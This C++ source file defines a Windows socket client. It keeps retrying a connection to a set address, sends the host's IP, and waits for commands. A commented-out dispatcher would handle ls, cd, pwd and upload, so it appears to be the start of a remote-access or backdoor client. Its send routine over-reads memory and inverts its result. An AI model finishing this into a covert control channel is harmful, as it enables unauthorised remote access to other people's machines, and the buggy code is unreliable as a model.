#include "pch.h"
#include "Client.h"
#pragma warning(disable:4996) 
#define SIZE_BUFFER 256

Client::Client(const char* addr,const unsigned short &port) : Socket_()
{
	
	SOCKADDR_IN sin;
	int val;
	this->setSock(socket(AF_INET, SOCK_STREAM, 0));
	sin.sin_addr.s_addr = inet_addr(addr);

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	std::cout << "[*] Connection to " << addr << ":" << port << std::endl;
	val = connect(this->getSock(), (SOCKADDR *)&sin, sizeof(sin));

	while (val != 0)
	{
		Sleep(1000);
		if (val == INVALID_SOCKET)
		{
			this->setError(1);
			std::cout << "Can't reach : " << addr<<":" << port << std::endl;
		}
		else
		{
			std::cout << "[*] Done" << std::endl;
		}
		val = connect(this->getSock(), (SOCKADDR *)&sin, sizeof(sin));

	}
	init();

}

bool Client::init()
{
	setIp(Auto::get_ip());
	send_b(getIp().c_str());
	return 1;
}
Client::~Client()
{}

bool Client::send_b(const char* pbuffer)
{
	if (send(this->getSock(), pbuffer, SIZE_BUFFER, 0) == 0)
		return 1;
	else
		return 0;
}

void Client::compare(char* pbuffer)
{
	std::cout << "hello" << std::endl;
	
	/*
	if (!(strcmp(pbuffer, "ls")))
	{
	std::cout << "LS" << std::endl;
	ls(this->getSock());
	}
	else if (!(strcmp(pbuffer, "cd")))
	{
	cd(this->getSock(), pbuffer);
	}
	else if (!(strcmp(pbuffer, "pwd")))
	{
	pwd(this->getSock());
	}
	else if (!(strcmp(pbuffer,"upload")))
	{
	upload_c(this);
	}
	else
	{
	SetColor(6);
	std::cout << "[*] " << pbuffer << std::endl;
	SetColor(7);
	Sleep(0.1);
	}
	*/
}

bool Client::recv_b()
{
	char b[SIZE_BUFFER] = { 0 };
	if ((recv(this->getSock(), b, sizeof(b), 0) > 0))
	{
		this->setBuffer(b);
		compare(b);
		Sleep(300);
		return 1;
	}
	else
		return 0;
}
void Client::setIp(const std::string& pIp) { Ip = pIp; }
std::string Client::getIp() const { return Ip; }